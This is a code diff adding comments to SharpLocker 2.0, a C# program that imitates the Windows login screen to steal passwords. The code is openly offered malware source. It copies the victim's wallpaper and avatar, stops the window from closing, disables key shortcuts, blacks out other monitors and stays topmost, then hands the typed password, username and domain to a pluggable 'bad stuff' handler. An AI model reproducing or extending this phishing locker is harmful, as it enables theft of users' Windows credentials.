@@ -18,9 +18,11 @@ namespace SharpLocker_2._0
     {
         #region "Variables and Stuff"
 
+        // Decides wether the form can be closed or not
         private bool DenyClose { get; set; }
         private Interfaces.IDoBadStuff DoBadStuff;
 
+        // Placeholder text for password textbox
         private const string PLACEHOLDER_TEXT = "Password";
 
         #endregion
@@ -33,6 +35,7 @@ namespace SharpLocker_2._0
 
         #region "Lock"
 
+        // Gets called when main login form would be closing
         private void WindowsLogin_FormClosing(object sender, FormClosingEventArgs e)
         {
 #if !DEBUG
@@ -53,8 +56,10 @@ namespace SharpLocker_2._0
 
         #endregion
 
+        // Gets called when the Login Button is clicked or the enter key event is triggered on the password text box
         private void LoginButton_Click(object sender, EventArgs e)
         {
+            // Do nothing if no password has been entered
             if (string.IsNullOrEmpty(PasswordTextBox.Text)) return;
             if (PasswordTextBox.Text == PLACEHOLDER_TEXT) return;
 
@@ -62,6 +67,7 @@ namespace SharpLocker_2._0
 #if !DEBUG
                 KeyPressHandler.Enable();
 #endif
+            // Time for malicious business 😏
             DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName);
 
             Close();
@@ -71,9 +77,15 @@ namespace SharpLocker_2._0
 
         private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
         {
-            CapsLockLabel.Visible = Control.IsKeyLocked(Keys.CapsLock);
+            // Show caps lock warning
+            CapsLockLabel.Visible = IsKeyLocked(Keys.CapsLock);
+
+            // send password
             if (e.KeyCode == Keys.Enter) LoginButton.PerformClick();
 
+            // WinForms doesn't have *real* placeholders, so we have to tinker around
+            // to make it seem like a real placeholder.
+            // this prevents moving the text cursor
             if (PasswordTextBox.Text == PLACEHOLDER_TEXT)
             {
                 if (e.KeyCode == Keys.Right || e.KeyCode == Keys.Left)
@@ -84,6 +96,7 @@ namespace SharpLocker_2._0
             }
         }
 
+        // decide wether to show the placeholder or not
         private void PasswordTextBox_TextChanged(object sender, EventArgs e)
         {
             TextBox tb = (TextBox)sender;
@@ -103,11 +116,15 @@ namespace SharpLocker_2._0
             }
         }
 
+        // WinForms doesn't have *real* placeholders, so we have to tinker around
+        // to make it seem like a real placeholder.
+        // this prevents placing the text cursor somewhere where it shouldn't be
         private void PasswordTextBox_Click(object sender, EventArgs e)
         {
             if (PasswordTextBox.Text == PLACEHOLDER_TEXT) PasswordTextBox.Select(0, 0);
         }
 
+        // Put placeholder text into password textbox
         private void SetPlaceholder()
         {
             PasswordTextBox.UseSystemPasswordChar = false;
@@ -123,10 +140,12 @@ namespace SharpLocker_2._0
 
         private void WindowsLogin_Load(object sender, EventArgs e)
         {
+            // Blur background image after everything has been loaded
             BlurBackground();
             PasswordTextBox.Focus();
         }
 
+        // Handle all setup
         private void Initialize()
         {
             InitializeMisc();
@@ -142,21 +161,28 @@ namespace SharpLocker_2._0
 
         private void InitializeMisc()
         {
+            // disallow closing of the program
             DenyClose = true;
-            CapsLockLabel.Visible = false;
+            // display CapsLock notification if necessary
+            CapsLockLabel.Visible = IsKeyLocked(Keys.CapsLock);
+
+            // any release build of SharpLocker will allways be the top most window
 #if DEBUG
             TopMost = false;
 #else
-                TopMost = true;
+            TopMost = true;
 #endif
 
         }
 
+        // Show placeholder on startup
         private void InitializePasswordTextbox()
         {
             SetPlaceholder();
         }
 
+        // Check wether a .dll file implementing IDoBadStuff is available
+        // if its available, it replaces the default bad stuff object
         private void InitializeBadStuff()
         {
             DoBadStuff = new Interfaces.BadStuffLoader().Get();
@@ -164,13 +190,15 @@ namespace SharpLocker_2._0
             if (DoBadStuff == null) DoBadStuff = new DefaultBadStuff();
         }
 
+        // disables certain key combinations in release builds
         private void InitializeTaskbar()
         {
 #if !DEBUG
-                KeyPressHandler.Disable();
+            KeyPressHandler.Disable();
 #endif
         }
 
+        // Display the users Username on the form
         private void InitializeUserLabel()
         {
             try
@@ -183,22 +211,27 @@ namespace SharpLocker_2._0
             }
         }
 
+        // Load the users wallpaper
         private Bitmap GetBackgroundImage() => new Bitmap(@Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                 "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));
 
+        // Set the users wallpaper as the form background
         private void InitializeBackground() => BackgroundImage = GetBackgroundImage();
 
+        // blur the users wallpaper and set it as the form background
         private void BlurBackground()
         {
             GaussianBlur blur = new GaussianBlur(GetBackgroundImage());
             BackgroundImage = blur.Process(2);
         }
 
+        // Load the current users profile picture into the form
         private void InitializeUserIcon()
         {
             SetUserIconByName(Environment.UserName, UserIconPictureBox);
         }
 
+        // Get a users profile picture from a directory
         private Image GetUserIconFromPath(string fileEnding, string path)
         {
             try
@@ -218,15 +251,18 @@ namespace SharpLocker_2._0
             }
         }
 
+        // Load the users avatar by knowing his user name
         private void SetUserIconByName(string username, PictureBox pb)
         {
             Image img = null;
 
             string path = Path.GetTempPath();
 
+            // if no username is given or "other user" is selected (think domain account), load default avatar
             if (string.IsNullOrEmpty(username) || username == "Other User")
                 img = Properties.Resources.defaultAvatar;
 
+            // Check for user avatar with multiple file extensions
             if (img is null)
                 img = GetUserIconFromPath("bmp", path);
 
@@ -239,6 +275,8 @@ namespace SharpLocker_2._0
             if (img is null)
                 img = Properties.Resources.defaultAvatar;
 
+
+            // resize image and make it a circle
             pb.Image = ResizeImage(img, pb.Width, pb.Height);
 
             GraphicsPath gp = new GraphicsPath();
@@ -247,6 +285,7 @@ namespace SharpLocker_2._0
             pb.Region = rg;
         }
 
+        // Resize any image to a certain size
         public Bitmap ResizeImage(Image image, int width, int height)
         {
             var destRect = new Rectangle(0, 0, width, height);
@@ -272,6 +311,7 @@ namespace SharpLocker_2._0
             return destImage;
         }
 
+        // on release builds, black out all non-primary screens
         private void InitializeOtherScreens()
         {
 #if !DEBUG
@@ -282,6 +322,7 @@ namespace SharpLocker_2._0
 #endif
         }
 
+        // Create a fullscreen black form
         private void BlackScreen(Screen screen)
         {
             Form blackForm = new Form()
@@ -299,6 +340,7 @@ namespace SharpLocker_2._0
             blackForm.ShowDialog();
         }
 
+        // draw a white border around the password text box
         private void WindowsLogin_Paint(object sender, PaintEventArgs e)
         {
             int offset = 1;
@@ -309,12 +351,14 @@ namespace SharpLocker_2._0
                 PasswordTextBox.Height + offset));
         }
 
+        // Load all local users on targets pc and display them in the lower left corner
         private void InitializeOtherUsers()
         {
             AddChangeUserPanel("Other User", 0);
             AddChangeUserPanel(UserPrincipal.Current.DisplayName, 1);
         }
 
+        // create a "other user" control with given properties, then place it on screen
         private void AddChangeUserPanel(string user, int panelCount)
         {
             int panelX = 12;
